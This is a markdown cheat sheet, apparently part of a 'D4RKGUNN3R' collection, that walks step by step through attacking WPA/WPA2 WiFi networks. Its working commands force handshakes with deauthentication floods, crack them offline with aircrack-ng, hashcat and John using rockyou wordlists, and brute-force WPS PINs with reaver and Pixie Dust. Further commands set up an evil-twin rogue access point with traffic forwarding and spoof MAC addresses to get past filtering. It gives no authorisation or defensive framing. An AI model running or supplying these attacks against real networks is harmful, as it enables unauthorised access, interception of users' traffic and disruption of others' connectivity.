# WiFi Cracking (WPA/WPA2)

## Setup

### Wireless Adapter Requirements

```bash
# Check supported mode
iwconfig
airmon-ng check

# Install aircrack-ng suite
apt-get install aircrack-ng
```

### Enable Monitor Mode

```bash
# Using airmon-ng
airmon-ng start wlan0
# Creates wlan0mon (or similar)

# Or manually (older method)
ip link set wlan0 down
iwconfig wlan0 mode monitor
ip link set wlan0 up

# Verify
iwconfig | grep -i mode
```

## Network Discovery

### Scan for Networks

```bash
# Simple scan
airodump-ng wlan0mon

# Scan specific channel
airodump-ng --channel 1 wlan0mon

# Save capture for offline analysis
airodump-ng --write capture -o csv wlan0mon
```

### Read Saved Capture

```bash
# View BSSID, SSID, channel, encryption
airodump-ng capture-01.csv --bssid <TARGET_MAC>
```

## WPA Handshake Capture

### Passive Capture (Wait for Handshake)

```bash
# Monitor target network
airodump-ng --bssid <BSSID> --channel <CHANNEL> --write handshake wlan0mon

# Wait for client to connect/disconnect
# "WPA handshake: <BSSID>" appears when captured
```

### Active Deauthentication (Force Handshake)

```bash
# Force client to reconnect
aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# Sends 10 deauth packets to client <CLIENT_MAC>
# Client will reconnect, generating handshake

# Deauth all clients (if client MAC unknown)
aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

## Handshake Validation

```bash
# Check if valid handshake in capture
aircrack-ng handshake-01.cap -b <BSSID>

# Should output:
# "[+] BSSID : <MAC>
# [...] Number of packets : 12345
# [...] Number of IV : 1000
# [...] Handshake: YES (or PARTIAL)"
```

## Password Cracking

### Offline Cracking (Aircrack-ng)

```bash
# Basic cracking
aircrack-ng handshake-01.cap -w rockyou.txt

# Specify BSSID to speed up
aircrack-ng handshake-01.cap -b <BSSID> -w rockyou.txt

# Try multiple wordlists
aircrack-ng handshake-01.cap -w list1.txt -w list2.txt
```

### Hashcat (Faster)

```bash
# Convert cap to HCCAPX format
cap2hccapx.py handshake.cap handshake.hccapx

# Crack with hashcat
hashcat -m 2500 handshake.hccapx rockyou.txt

# Or use WPA-PMKID mode (if PMKID available)
hashcat -m 16800 pmkid.txt rockyou.txt
```

### John the Ripper

```bash
# Convert handshake
john --format=wpapsk --wordlist=rockyou.txt handshake.cap
```

## WPS (WiFi Protected Setup) Exploitation

### Reaver (Brute Force PIN)

```bash
# Attack WPS
reaver -i wlan0mon -b <BSSID> -vv

# Options:
# -N : Ignore 60s timeout between failed attempts (aggressive)
# -p <PIN> : Test specific PIN
# --pixie-dust : Use Pixie Dust attack (faster)
```

### Pixie Dust Attack

```bash
# Faster WPS crack (if vulnerable)
reaver -i wlan0mon -b <BSSID> --pixie-dust -vv

# If successful, outputs WiFi password
```

## Dictionary Attack Optimization

### Generate Wordlist from Website

```bash
# Create custom wordlist
cewl https://target.com -d 4 -w custom.txt

# Combine with rockyou
cat rockyou.txt custom.txt > combined.txt
sort -u combined.txt > unique.txt
```

### Apply Mangling Rules

```bash
# Create rules file (mangling_rules.txt)
# c = capitalize
# l = lowercase
# u = uppercase
# r = reverse
# $ = append
# ^ = prepend

# Apply with hashcat
hashcat -m 2500 handshake.hccapx -w rockyou.txt -r mangling_rules.txt
```

## Evil Twin / Rogue AP

### Setup Rogue Access Point

```bash
# Create fake network
hostapd hostapd.conf &
# hostapd.conf should specify:
# ssid=TARGET_SSID
# channel=6
# hw_mode=g

# Assign IP and DHCP
ifconfig wlan0 192.168.1.1
dnsmasq -C /dev/null -z -l 150 -E -F 192.168.1.100,192.168.1.150 -i wlan0

# Redirect traffic (optional)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -j ACCEPT
```

### Capture Handshake from Rogue AP

```bash
# Clients connecting to rogue AP will perform WPA handshake
# Capture with airodump-ng pointed at your AP
airodump-ng --write evil-twin-handshake wlan0mon
```

## Other Attacks

### KRACK (WiFi 802.11 Key Reinstallation)

```bash
# Requires vulnerable router + specific client
# Exploits four-way handshake replay
# Mostly patched in modern systems

# Check vulnerability
https://www.krackattacks.com/
```

### MAC Address Spoofing (Bypass Filtering)

```bash
# Get target client MAC
airodump-ng wlan0mon | grep <BSSID>

# Spoof your MAC
ip link set dev wlan0 down
ip link set dev wlan0 address <TARGET_MAC>
ip link set dev wlan0 up
```

## Cleanup

```bash
# Disable monitor mode
airmon-ng stop wlan0mon

# Or manually
ip link set wlan0 down
iwconfig wlan0 mode managed
ip link set wlan0 up

# Restart networking
systemctl restart NetworkManager
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README-CHEATSHEETS.md) collection.*

</div>
